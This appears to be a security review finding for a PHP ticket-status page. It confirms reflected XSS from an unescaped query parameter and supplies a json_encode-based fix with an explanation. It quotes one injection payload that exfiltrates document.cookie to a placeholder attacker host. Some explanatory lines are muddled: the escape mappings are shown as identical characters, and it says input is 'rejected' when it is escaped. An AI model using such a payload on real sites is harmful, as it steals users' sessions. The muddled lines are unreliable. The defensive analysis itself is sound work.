## Verdict

Confirmed. `$agentNote` is taken from `$_GET['agent_note']` and echoed verbatim into a single-quoted JavaScript string literal on line 29. A value such as `x'; document.location='//evil.example/?c='+document.cookie; var y='` closes the literal and injects arbitrary script that runs in the page and is then assigned into the DOM via `innerText` (which itself is safe, but the damage is already done by the time that line runs).

## Source

`$agentNote = $_GET['agent_note'] ?? '';` in `JsContextUnescapedPhp.php`, line 7 — attacker-controlled, unauthenticated, unvalidated query-string input.

## Fix

### File: JsContextUnescapedPhp.php

```php
<?php
// support/ticket_status.php - shows a live status banner for a submitted ticket

session_start();

$ticketId = isset($_GET['ticket_id']) ? (int) $_GET['ticket_id'] : 0;
$agentNote = $_GET['agent_note'] ?? '';

$ticket = fetchTicketById($ticketId);
if (!$ticket) {
    http_response_code(404);
    exit('Ticket not found');
}

function fetchTicketById(int $id): ?array
{
    // Placeholder for a real lookup against the support database.
    return ['id' => $id, 'subject' => 'Cannot reset password'];
}
?>
<!DOCTYPE html>
<html>
<head><title>Ticket #<?php echo (int) $ticket['id']; ?></title></head>
<body>
    <h1>Ticket Status</h1>
    <div id="banner"></div>
    <script>
        var agentNote = <?php echo json_encode(
            $agentNote,
            JSON_HEX_TAG | JSON_HEX_APOS | JSON_HEX_QUOT | JSON_HEX_AMP
        ); ?>;
        document.getElementById('banner').innerText = 'Agent note: ' + agentNote;
    </script>
</body>
</html>
```

## Explanation

The sink is a value interpolated directly into a JavaScript source literal, not into HTML markup, so `htmlspecialchars()` would not help here — it neutralizes `<`, `>`, and `&` for an HTML parser but does nothing about a JavaScript string terminator like `'`, a backslash, or a line terminator such as U+2028, all of which are meaningful inside a `<script>` block and none of which `htmlspecialchars()` touches.

The fix uses `json_encode()` to produce the value as a properly quoted, properly escaped JavaScript string literal, so the `<?php ... ?>` block now emits both the surrounding quotes and the value (the original single quotes around the placeholder are removed to avoid double-quoting). `json_encode()` already escapes the characters that matter for a JS string context: `"`, `\`, control characters, and the U+2028/U+2029 line separators that would otherwise terminate a JS statement inside a `<script>` tag even though they're invisible in HTML.

The four `JSON_HEX_*` flags close two additional gaps that plain `json_encode()` leaves open:

- `JSON_HEX_APOS` escapes `'` to `'`. `json_encode()` normally quotes with `"`, which is already safe against breaking out of a single-quoted literal, but adding this flag keeps the output safe even if the surrounding literal style changes later, and covers any single quotes appearing inside the string value itself.
- `JSON_HEX_TAG` escapes `<` and `>` to `<`/`>`, which prevents a value containing `</script>` from prematurely closing the enclosing `<script>` tag — an HTML-parser-level concern that a JS-string-escaping function does not otherwise address, since `</script>` inside a string literal still terminates the tag as far as the browser's HTML tokenizer is concerned.
- `JSON_HEX_AMP` and `JSON_HEX_QUOT` escape `&` and `"`, closing the same class of problem defensively in case this value is ever reused inside an HTML attribute.

The result is rejected outright rather than stripped: the attacker's characters are represented as escape sequences that decode back to the literal, unexecuted text, so the banner still displays the note's true content instead of silently dropping or mangling it.
